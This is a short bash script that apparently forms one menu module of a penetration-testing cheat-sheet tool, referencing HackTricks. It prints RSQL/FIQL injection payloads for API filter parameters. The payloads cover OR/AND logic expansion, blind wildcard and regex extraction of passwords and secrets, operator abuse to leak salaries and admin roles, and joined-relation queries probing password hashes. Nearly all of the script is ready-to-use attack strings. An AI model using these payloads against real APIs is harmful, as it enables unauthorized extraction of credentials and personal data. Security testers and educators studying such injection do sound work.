#!/bin/bash
# HackTricks Ref: rsql-fiql-injection
# Module: RSQL / FIQL Injection (API Filtering Bypass)

echo -e "${C6}[WEB ATTACK: RSQL_INJECTION]${NC}"
echo -e "Reference: https://github.com/jknack/rsql-parser"
echo -e "--------------------------------------------------"

echo -e "${C4}Select RSQL/FIQL Injection Vector:${NC}"
echo "1) Logic Expansion (OR/AND Manipulation)"
echo "2) Blind Data Extraction (Wildcard/Regex)"
echo "3) Comparison Operator Abuse (GT/LT)"
echo "4) Information Leakage via Joined Relations"
echo "0) Exit"

read -p "Selection: " rsql_opt

case $rsql_opt in
    1)
        echo -e "\n${C2}[*] Logic Expansion:${NC}"
        echo "If the query is: /api/users?filter=status=='active'"
        echo "Try to expand it to include all users:"
        echo " - ?filter=status=='active',id=gt=0"
        echo " - ?filter=status=='active';username=='admin'"
        echo -e "${C4}Note:${NC} ',' is OR, ';' is AND in most RSQL implementations."
        ;;
    2)
        echo -e "\n${C2}[*] Blind Extraction:${NC}"
        echo "Use wildcards or regex operators to guess values:"
        echo " - ?filter=password==admin*"
        echo " - ?filter=email==*@internal.corp"
        echo " - ?filter=secret==re('.*flag.*')"
        ;;
    3)
        echo -e "\n${C2}[*] Comparison Operator Abuse:${NC}"
        echo "Try to leak sensitive numeric or date data:"
        echo " - ?filter=salary=gt=0"
        echo " - ?filter=birthDate=lt=2000-01-01"
        echo " - ?filter=role=in=('ADMIN','SUPERUSER')"
        ;;
    4)
        echo -e "\n${C2}[*] Joined Relations Leakage:${NC}"
        echo "If the backend uses JPA/Hibernate, you might access related objects:"
        echo " - ?filter=group.permissions.name=='ADMIN_ACCESS'"
        echo " - ?filter=owner.passwordHash==*a*"
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
